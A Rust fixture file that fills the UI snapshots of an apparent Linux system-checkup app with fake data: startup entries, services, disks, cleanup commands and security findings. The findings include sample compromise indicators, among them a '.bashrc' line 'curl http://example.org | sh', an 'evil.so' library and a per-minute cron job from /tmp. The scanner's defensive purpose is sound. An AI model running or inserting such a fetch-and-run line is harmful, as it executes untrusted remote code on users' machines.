//! Canned data for `scripts/ui-snapshot.sh` (`FASTCHECKUP_FIXTURES=empty|single|many`): every page can be rendered with
//! zero, one or many rows without scanning or touching the real system.
use slint::{Model, ModelRc, SharedString, VecModel};

use crate::*;

/// 0 empty, 1 single, 2 many; `None` when the variable is unset or unknown.
pub fn mode() -> Option<usize> {
    match std::env::var("FASTCHECKUP_FIXTURES").ok()?.as_str() {
        "empty" => Some(0),
        "single" => Some(1),
        "many" => Some(2),
        _ => None,
    }
}

fn model<T: Clone + 'static>(mode: usize, make: impl Fn(usize) -> T) -> ModelRc<T> {
    fixed([0, 1, 12][mode], make)
}

/// For lists whose size is not "one or many", e.g. the five boot phases.
fn fixed<T: Clone + 'static>(n: usize, make: impl Fn(usize) -> T) -> ModelRc<T> {
    ModelRc::new(VecModel::from((0..n).map(make).collect::<Vec<_>>()))
}

fn text(mode: usize, make: impl Fn(usize) -> String) -> SharedString {
    (0..[0, 1, 4][mode]).map(make).collect::<Vec<_>>().join("\n").into()
}

fn left(i: usize, what: &str) -> Left {
    Left {
        id: format!("{what}-{i}").into(),
        path: format!("/home/user/{what}/{i}").into(),
        size_mb: 40.0 * (i + 1) as f32,
        last: "2026-03-14".into(),
        keep: 0,
        used: "".into(),
    }
}

pub fn apply(ui: &Main, m: usize) {
    ui.set_rows(model(m, |i| Row {
        file: format!("app{i}.desktop").into(),
        name: format!("Example startup app {i}").into(),
        comment: "Does something at login".into(),
        exec: format!("/usr/bin/example-{i} --background").into(),
        source: format!("/etc/xdg/autostart/app{i}.desktop").into(),
        target: format!("/home/user/.config/autostart/app{i}.desktop").into(),
        essential: i == 1,
        state: (i % 2) as i32,
        duplicate_of: if i == 2 {
            "Example startup app 0".into()
        } else {
            "".into()
        },
        ..Row::default()
    }));
    let history = model(m, |i| HistoryRow {
        time: "2026-10-28 14:05".into(),
        kind: (i % 5) as i32,
        name: format!("example-{i}").into(),
    });
    ui.set_history_text(
        (0..history.row_count())
            .map(|i| {
                let h = history.row_data(i).unwrap();
                ui.global::<Tr>()
                    .invoke_history_line(h.time, h.kind, h.name)
                    .to_string()
            })
            .collect::<Vec<_>>()
            .join("\n")
            .into(),
    );
    ui.set_history(history);
    ui.set_services(model(m, |i| Svc {
        unit: format!("example-{i}.service").into(),
        description: "A background program that takes a while to start".into(),
        enabled: i % 2 == 0,
        active: i % 3 != 0,
        secs: 0.5 * (i + 1) as f32,
        essential: i == 1,
        background: i % 4 == 0,
    }));

    // Overview "Right now": empty = not sampled yet, single = fine with one app, many = short of memory.
    ui.set_perf_level([0, 1, 3][m]);
    ui.set_perf_cause([0, 0, 1][m]);
    ui.set_perf_uptime_s(if m == 0 { 0 } else { 3 * 86400 + 5000 });
    ui.set_perf_cpus(8);
    ui.set_perf_load(if m == 2 { 7.8 } else { 1.2 });
    ui.set_perf_mem_total_mb(16000.0);
    ui.set_perf_mem_avail_mb(if m == 2 { 600.0 } else { 9000.0 });
    ui.set_perf_swap_total_mb(if m == 0 { 0.0 } else { 4096.0 });
    ui.set_perf_swap_used_mb(if m == 2 { 3500.0 } else { 120.0 });
    ui.set_perf_apps(fixed([0, 1, 5][m], |i| PerfApp {
        name: if i == 3 {
            "a-program-with-a-very-long-name-that-has-to-be-cut-somewhere".into()
        } else {
            format!("example-app-{i}").into()
        },
        procs: if m == 2 { 1 + 3 * i as i32 } else { 1 },
        cpu: 42.0 - 8.0 * i as f32,
        mem_mb: 2400.0 - 450.0 * i as f32,
    }));
    ui.set_boot_total(if m == 0 { 0.0 } else { 38.4 });
    ui.set_phases(fixed(if m == 0 { 0 } else { 5 }, |i| Phase {
        kind: i as i32,
        secs: 4.0 + i as f32,
    }));
    ui.set_chain(model(m, |i| Link {
        unit: if i % 3 == 2 {
            format!("mnt-data{i}.mount")
        } else {
            format!("example-{i}.service")
        }
        .into(),
        at: 2.0 + i as f32,
        took: if i == 3 { 12.5 } else { 0.25 * (i + 1) as f32 },
        frac: if i == 3 { 1.0 } else { 0.02 * (i + 1) as f32 },
        optional: i % 2 == 0,
        slowest: i == 3,
        mount: i % 3 == 2,
    }));
    ui.set_grub(Grub {
        loader: 0,
        efi: true,
        timeout: 5,
        style: "menu".into(),
        overridden: "".into(),
        windows: m == 2,
        has_backup: m == 2,
    });
    ui.set_bios_board("Example Board (BIOS 1.0)".into());

    ui.set_apps(model(m, |i| AppRow {
        id: format!("app-{i}").into(),
        name: format!("Example application {i}").into(),
        source: (i % 3) as i32,
        size_mb: 120.0 * (i + 1) as f32,
        manual: i % 2 == 0,
        essential: i == 1,
        last: if i % 4 == 3 { "".into() } else { "2026-01-10".into() },
        stale: i % 5 == 4,
        group: if i % 4 == 0 { 0 } else { -1 },
        group_count: if i % 4 == 0 { 3 } else { 0 },
        icon: crate::icon(if i % 2 == 0 { "applications-system" } else { "" }),
    }));
    ui.set_kernels(model(m, |i| Kern {
        running: i == 0,
        keep: i < 2,
        version: format!("7.0.0-{}", 38 - i).into(),
        size_mb: 310.0,
    }));
    ui.set_leftovers(model(m, |i| left(i, "flatpak-data")));
    ui.set_home_data(model(m, |i| left(i, ".config/example")));
    ui.set_stale_startup(model(m, |i| Left {
        id: format!("gone{i}.desktop").into(),
        used: format!("Example removed app {i}").into(),
        path: format!("gone{i} start").into(),
        ..Left::default()
    }));
    // The app joins these with ", " (main.rs), so the fixture does too.
    let list = |m: usize| {
        SharedString::from(
            (0..[0, 1, 4][m])
                .map(|i| format!("package-{i}"))
                .collect::<Vec<_>>()
                .join(", "),
        )
    };
    ui.set_auto_list(list(m));
    ui.set_auto_mb(if m == 0 { 0.0 } else { 210.0 });
    ui.set_res_list(list(m));
    ui.set_res_mb(if m == 0 { 0.0 } else { 4.0 });
    ui.set_rt_list(list(m));
    ui.set_rt_mb(if m == 0 { 0.0 } else { 650.0 });

    // `empty` is also the "nothing scanned yet" Overview. The page is set directly, so no scan starts.
    ui.set_store_scanned(m != 0);
    // Fullest first, like the real scan.
    ui.set_mounts(model(m, |i| {
        let j = [0, 1, 12][m] - 1 - i;
        Mnt {
            path: if j == 0 {
                "/".into()
            } else {
                format!("/media/user/Disk{j}").into()
            },
            used_gb: 40.0 * (j + 1) as f32,
            total_gb: 500.0,
            pct: (8 * (j + 1)) as i32,
        }
    }));
    ui.set_top_folders(model(m, |i| left(i, "folder")));
    ui.set_big_files(model(m, |i| left(i, "big-file.iso")));
    ui.set_games(model(m, |i| left(i, "game")));
    ui.set_old_versions(model(m, |i| Left {
        keep: i as i32 % 5,
        used: if i % 5 == 2 {
            "Hollow Knight, Overwatch, Hi-Fi RUSH, Divinity Original Sin 2, MarvelRivals, Another Game".into()
        } else {
            "".into()
        },
        ..left(i, "toolchain")
    }));
    ui.set_builds(model(m, |i| left(i, "recent/target")));
    ui.set_old_builds(model(m, |i| left(i, "project/target")));
    ui.set_old_trash(model(m, |i| Left {
        last: "2026-01-05".into(),
        ..left(i, "deleted-folder")
    }));
    ui.set_installers(model(m, |i| left(i, "installer.deb")));
    ui.set_caches(model(m, |i| left(i, "cache")));
    ui.set_docker(fixed(if m == 0 { 0 } else { 2 }, |i| Dock {
        kind: ["Images", "Containers"][i].into(),
        size: "1.2GB".into(),
        reclaim: "800MB (66%)".into(),
    }));
    ui.set_trash_count([0, 1, 53][m]);
    ui.set_trash_mb([0.0, 2.0, 640.0][m]);
    ui.set_journal_mb([0.0, 4.0, 512.0][m]);
    ui.set_apt_mb([0.0, 0.5, 840.0][m]);
    // The same sums the real scan makes for the Safe and Almost safe tiles (the Docker cache is left out here).
    let sum = |l: ModelRc<Left>| l.iter().map(|r| r.size_mb).sum::<f32>();
    ui.set_safe_scan_mb(
        sum(ui.get_caches())
            + ui.get_apt_mb()
            + if ui.get_journal_mb() > 105.0 {
                ui.get_journal_mb() - 105.0
            } else {
                0.0
            },
    );
    let old_versions: f32 = ui
        .get_old_versions()
        .iter()
        .filter(|v| v.keep == 0)
        .map(|v| v.size_mb)
        .sum();
    ui.set_almost_free_mb(sum(ui.get_old_builds()) + sum(ui.get_installers()) + sum(ui.get_old_trash()) + old_versions);
    // Two groups for `many` (an original and 2 copies, an original and 1), one pair for `single`.
    let dup = |id: &str, size: f32, orig: &str| Left {
        id: id.into(),
        path: orig.into(),
        size_mb: size,
        last: "2026-03-14".into(),
        keep: if orig.is_empty() { 5 } else { 0 },
        used: "".into(),
    };
    let (a, b) = ("/home/user/Videos/trip.mp4", "/home/user/Pictures/scan.pdf");
    let rows = [
        vec![],
        vec![dup(a, 120.0, ""), dup("/home/user/Downloads/trip.mp4", 120.0, a)],
        vec![
            dup(a, 120.0, ""),
            dup("/home/user/Downloads/trip.mp4", 120.0, a),
            dup("/home/user/Desktop/trip copy.mp4", 120.0, a),
            dup(b, 4.5, ""),
            dup("/home/user/Documents/scan.pdf", 4.5, b),
        ],
    ];
    ui.set_dups(ModelRc::new(VecModel::from(rows[m].clone())));
    ui.set_dup_scanned(m != 0);
    ui.set_snap_count([0, 0, 14][m]);
    ui.set_snap_oldest(["", "", "2025-11-02"][m].into());
    ui.set_snap_set_up(m != 0);
    // Fixed ages so the snapshots do not change between runs.
    ui.set_store_ago([-1, 0, 75][m]);
    ui.set_health_ago([-1, 0, 5][m]);
    ui.set_security_ago([-1, 0, 130][m]);

    ui.set_health_scanned(m != 0);
    ui.set_disk_warning(m == 2);
    ui.set_other_problems(text(m / 2, |i| {
        format!("ata{i} failed to read or write data 3 times. System message: example")
    }));
    ui.set_backup_state([0, 1, 2][m]);
    ui.set_backup_latest("2026-11-04_08-00-01".into());
    ui.set_crashes(text(m, |i| {
        format!("reboot system boot 7.0.0-38 Mon Oct {} 08:00 - crash", 20 + i)
    }));
    // `empty` is unprotected with no evidence, `single` has zram, `many` is unprotected after a freeze and a kill.
    crate::show_memory(
        ui,
        &health::Memory {
            swap: if m == 1 { vec!["/dev/zram0".into()] } else { vec![] },
            watcher: String::new(),
            oom_kills: if m == 2 { 2 } else { 0 },
        },
        m == 2,
    );
    ui.set_disks(fixed([0, 1, 3][m], |i| Disk {
        name: format!("sd{}", (b'a' + i as u8) as char).into(),
        model: "SAMSUNG HD103SJ".into(),
        size: "931,5G".into(),
        kind: (i % 4) as i32,
        info: text(m, |p| format!("Data{p} (465G) is mounted at /media/user/Data{p}.")),
        parts: [0, 1, 4][m],
        problems: if i == 0 && m == 2 {
            "Files_HD (931,5G) failed to mount at /media/Files_HD. Do not make it mount automatically; check the disk first.\nsda failed to read or write data 13 times. System message: Medium Error".into()
        } else {
            "".into()
        },
        state: [0, 1, 2][i % 3],
        reallocated: if i % 3 == 2 { 8 } else { 0 },
        pending: if i % 3 == 2 { 2 } else { 0 },
        ..Disk::default()
    }));

    ui.set_security_scanned(m != 0);
    ui.set_fw_state([0, 3, 2][m]);
    ui.set_fw_text(
        ["", "administrator password was not given", "Status: active\nLogging: on (low)\nDefault: deny (incoming), allow (outgoing), disabled (routed)\n\nTo                         Action      From\n--                         ------      ----\n22/tcp                     ALLOW IN    Anywhere\n445                        ALLOW IN    192.168.0.0/24"][m]
            .into(),
    );
    set_findings(
        ui,
        (0..[0, 1, 16][m])
            .map(|i| Finding {
                code: [0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 1, 8, 11, 13, 14][i],
                level: [1, 0, 2, 2, 1, 1, 1, 1, 1, 1, 1, 0, 1, 1, 1, 0][i],
                subject: [
                    "tcp 139, tcp 445",
                    "firefox",
                    "/tmp/x/evil",
                    "/lib/evil.so",
                    "* * * * * /tmp/x",
                    "syncthing.service",
                    "/home/user/.ssh/authorized_keys",
                    "/home/user/.bashrc",
                    "Grammar Thing",
                    "",
                    "inactive",
                    "smbd",
                    "Dark Mode",
                    "libc6, linux-base",
                    "",
                    "linux-image-generic",
                ][i]
                    .into(),
                extra: [
                    "smbd",
                    "1.2.3.4:443, 5.6.7.8:443",
                    "evil",
                    "",
                    "",
                    "",
                    "",
                    "curl http://example.org | sh",
                    "<all_urls>, cookies",
                    "",
                    "",
                    "10.0.0.5:445",
                    "<all_urls>",
                    "",
                    "3",
                    "",
                ][i]
                    .into(),
                // The browser index for an add-on (see `security::BROWSERS`); the count for code 13.
                n: [3, 3, 3, 3, 3, 3, 3, 3, 1, 3, 3, 1, 3, 0, 12, 1][i],
                group: 0,
                app: [
                    "smbd", "Firefox", "", "", "", "", "", "", "Chromium", "", "", "smbd", "Firefox", "", "", "",
                ][i]
                    .into(),
                icon: crate::icon(
                    [
                        "", "firefox", "", "", "", "", "", "", "chromium", "", "", "", "firefox", "", "", "",
                    ][i],
                ),
                path: [
                    "/usr/sbin/smbd",
                    "",
                    "",
                    "",
                    "",
                    "",
                    "",
                    "",
                    "",
                    "",
                    "",
                    "/usr/sbin/smbd",
                    "",
                    "",
                    "",
                    "",
                ][i]
                    .into(),
            })
            .collect(),
    );
    ui.set_sec_tools(fixed(6, |i| SecTool {
        name: ["rkhunter", "chkrootkit", "lynis", "clamscan", "debsums", "aide"][i].into(),
        cmd: "sudo apt install rkhunter && sudo rkhunter --check".into(),
        installed: i == 1,
    }));
    // `empty` is a machine where nothing could be read and no tool is installed.
    ui.set_sys_scanned(true);
    show_sysinfo(ui, &sys(m));
    set_totals(ui);
}

fn sys(m: usize) -> sysinfo::Info {
    use sysinfo::{DiskLine, Gpu, Monitor, Tool};
    if m == 0 {
        return sysinfo::Info::default();
    }
    let n = [0, 1, 3][m];
    sysinfo::Info {
        computer: "Gigabyte Technology Co., Ltd. B550M AORUS ELITE".into(),
        os: "Linux Mint 22.3".into(),
        kernel: "7.0.0-38-generic".into(),
        cpu: "AMD Ryzen 7 5800X3D 8-Core Processor".into(),
        cores: 8,
        threads: 16,
        cpu_mhz: 4550,
        mem_mb: 32100,
        // `single` has no swap, `many` has a file and zram.
        swap_mb: if m == 2 { 10240 } else { 0 },
        swap_devs: if m == 2 {
            vec!["/swapfile".into(), "/dev/zram0".into()]
        } else {
            vec![]
        },
        hostname: "example-pc".into(),
        uptime_secs: if m == 2 {
            3 * 86400 + 5 * 3600 + 12 * 60
        } else {
            47 * 60
        },
        desktop: "Cinnamon 6.6.9".into(),
        session: "x11".into(),
        bios_vendor: "American Megatrends International, LLC.".into(),
        bios_version: "FDb".into(),
        bios_release: "5.17".into(),
        bios_date: "08/10/2023".into(),
        board_vendor: "Gigabyte Technology Co., Ltd.".into(),
        board_name: "B550M AORUS ELITE".into(),
        board_version: "x.x".into(),
        uefi: true,
        secure_boot: Some(false),
        gpus: (0..n)
            .map(|i| Gpu {
                name: [
                    "NVIDIA Corporation AD104 [GeForce RTX 4070 SUPER]",
                    "Advanced Micro Devices, Inc. [AMD/ATI] Navi 23 [Radeon RX 6600/6600 XT/6600M] (rev c7)",
                    "Intel Corporation Alder Lake-S GT1 [UHD Graphics 770]",
                ][i]
                    .into(),
                pci: ["10de:2783", "1002:73ff", "8086:4680"][i].into(),
                driver: ["nvidia", "amdgpu", "i915"][i].into(),
                version: if i == 0 { "595.91.07".into() } else { String::new() },
                // The Intel one shares system RAM: no figure, so no row.
                vram_mb: [12282, 8176, 0][i],
            })
            .collect(),
        opengl: Tool::On("4.6.0 NVIDIA 595.91.07".into()),
        opengl_es: Tool::On("OpenGL ES 3.2 NVIDIA 595.91.07".into()),
        vulkan: Tool::On("NVIDIA GeForce RTX 4070 SUPER".into()),
        vaapi: Tool::Off(String::new()),
        vdpau: if m == 2 {
            Tool::Missing
        } else {
            Tool::On("NVIDIA VDPAU Driver Shared Library 595.91.07".into())
        },
        disks: (0..n)
            .map(|i| DiskLine {
                model: format!("Samsung SSD 980 PRO 1TB {i}"),
                size: "931.5G".into(),
                tran: if i == 1 { String::new() } else { "nvme".into() },
            })
            .collect(),
        usb: (0..[0, 1, 5][m])
            .map(|i| {
                [
                    "Microsoft Corp. Wired Keyboard 600 (model 1576)",
                    "Holtek Semiconductor, Inc. USB Gaming Mouse",
                    "Integrated Technology Express, Inc. RGB LED Controller",
                    "Logitech, Inc. Unifying Receiver",
                    "Realtek Semiconductor Corp. Bluetooth Radio",
                ][i]
                    .to_string()
            })
            .collect(),
        monitors: (0..n)
            .map(|i| Monitor {
                output: format!("HDMI-{i}"),
                // The last of three is switched off: no current mode.
                mode: if i == 2 { "".into() } else { "1920x1080".into() },
                hz: "74.97".into(),
            })
            .collect(),
        audio: (0..n)
            .map(|i| ["HDA NVidia", "HD-Audio Generic", "USB-Audio - Blue Yeti"][i].to_string())
            .collect(),
        network: vec![(
            "Realtek Semiconductor Co., Ltd. RTL8111/8168/8211/8411 PCI Express Gigabit Ethernet Controller".into(),
            "enp5s0".into(),
        )],
        // `single` flags only the watches, `many` flags both.
        max_watches: 8192,
        max_maps: if m == 2 { 65530 } else { 1_048_576 },
        big_watchers: if m == 2 {
            vec!["Dropbox".into(), "VS Code".into()]
        } else {
            vec!["Dropbox".into()]
        },
        steam: m == 2,
    }
}

/// `FASTCHECKUP_STATE=expanded|confirm`: puts the page in a state a click would reach (a row opened, a confirm dialog
/// shown) without clicking, so no coordinates are needed. It does not exercise the click handlers themselves.
pub fn state(ui: &Main, page: i32, state: &str) {
    let first = |ui: &Main| ui.get_rows().row_data(0);
    match (page, state) {
        (_, "menu") => ui.set_menu_open(true),
        (_, "sandboxed") => ui.set_sandboxed(true),
        (_, "admin-error") => {
            ui.set_admin_error("administrator password was not given".into());
            ui.set_admin_state(3);
        }
        (_, "about") => {
            ui.set_version(env!("CARGO_PKG_VERSION").into());
            ui.set_about_open(true);
        }
        (0, "expanded") => ui.set_open_file("app0.desktop".into()),
        (0, "confirm") => {
            if let Some(r) = first(ui) {
                ui.set_pending(r);
                ui.set_confirming(true);
            }
        }
        (1, "expanded") => ui.set_open_unit("example-0.service".into()),
        (1, "confirm") => {
            if let Some(s) = ui.get_services().row_data(0) {
                ui.set_svc_pending(s);
                ui.set_svc_confirming(true);
            }
        }
        (2, "confirm") => {
            ui.set_boot_action(0);
            ui.set_boot_secs(2);
            ui.set_boot_diff("-GRUB_TIMEOUT=5\n+GRUB_TIMEOUT=2".into());
            // Same shape as `boot::set_script` (one root script), so the snapshot shows how long the dialog gets.
            ui.set_boot_cmds(
                "pkexec /bin/sh -c '/usr/bin/cp -a /etc/default/grub /etc/default/grub.fastcheckup-<time>.bak || exit 1\n\
                 if /usr/bin/sed -i -E 's/^GRUB_TIMEOUT=.*/GRUB_TIMEOUT=2/' /etc/default/grub; then\n  \
                 if /usr/bin/cmp -s - /etc/default/grub; then\n    /usr/sbin/update-grub && exit 0\n    r=$?\n  \
                 else\n    echo \"the file does not match the preview\" >&2\n    r=1\n  fi\nelse\n  r=$?\nfi\n\
                 /usr/bin/cp -a /etc/default/grub.fastcheckup-<time>.bak /etc/default/grub >/dev/null 2>&1 \
                 && /usr/sbin/update-grub >/dev/null 2>&1\nexit $r'"
                    .into(),
            );
            ui.set_boot_confirming(true);
        }
        (9, "busy") => ui.set_perf_busy(true),
        (7 | 13, "bottom") => ui.set_scroll_bottom(true),
        (10, "group1") => ui.set_store_group(1),
        (10, "group2") => ui.set_store_group(2),
        (10, "group3") => ui.set_store_group(3),
        // The bulk dialog of a tier, with enough rows to need the scroll cap; the first row is unticked.
        (10, "bulk0" | "bulk1") => {
            let tier = i32::from(state == "bulk1");
            let rows: Vec<(i32, String, f32, &str)> = if tier == 0 {
                (0..10)
                    .map(|i| {
                        (
                            9,
                            format!("cache-{i}"),
                            40.0 + i as f32,
                            "rm -r /home/user/.cache/cache",
                        )
                    })
                    .chain([
                        (2, "flatpak-unused".to_string(), 300.0, "flatpak uninstall --unused -y"),
                        (11, "docker-builder".to_string(), 800.0, "docker builder prune -f"),
                        (3, "apt-autoremove".to_string(), 120.0, ""),
                        (16, "apt-cache".to_string(), 840.0, ""),
                        (10, "journal".to_string(), 412.0, ""),
                    ])
                    .collect()
            } else {
                vec![
                    (
                        6,
                        "/home/user/project/target".into(),
                        900.0,
                        "gio trash /home/user/project/target",
                    ),
                    (
                        7,
                        "installer.deb".into(),
                        40.0,
                        "gio trash /home/user/Downloads/installer.deb",
                    ),
                    (
                        13,
                        "/home/user/.steam/compatibilitytools.d/GE-Proton8-1".into(),
                        1200.0,
                        "gio trash -- ...",
                    ),
                    (
                        18,
                        "deleted-folder".into(),
                        12.0,
                        "rm -r '/home/user/.local/share/Trash/files/deleted folder' \
                         '/home/user/.local/share/Trash/info/deleted folder.trashinfo'",
                    ),
                ]
            };
            let rows: Vec<BulkRow> = rows
                .into_iter()
                .enumerate()
                .map(|(i, (action, id, size, cmd))| BulkRow {
                    action,
                    detail: match action {
                        2 => "org.gnome.Platform//44, org.freedesktop.Platform//22.08",
                        3 => "libfoo1, libfoo-dev, python3-old, gir1.2-bar-1.0",
                        _ => "",
                    }
                    .into(),
                    name: if action == 3 {
                        "4".into()
                    } else {
                        short_name(action, &id)
                    }
                    .into(),
                    id: id.into(),
                    size_mb: size,
                    on: i != 0,
                    cmd: cmd.into(),
                })
                .collect();
            ui.set_store_group(tier);
            ui.set_bulk_tier(tier);
            ui.set_bulk(ModelRc::new(VecModel::from(rows)));
            show_bulk(ui);
            ui.set_bulk_cmds_open(true);
            ui.set_bulk_confirming(true);
        }
        (7, "expanded") => ui.set_show_all_parts(true),
        (12, "expanded") => ui.set_mem_info_open(true),
        (3, "expanded") => ui.set_open_app("app-0".into()),
        (3, "confirm") => {
            ui.set_app_action(0);
            ui.set_app_source(0);
            ui.set_app_id("app-0".into());
            ui.set_app_cmd("pkexec apt-get remove app-0".into());
            ui.set_app_freed(120.0);
            ui.set_app_confirming(true);
        }
        _ => {}
    }
}
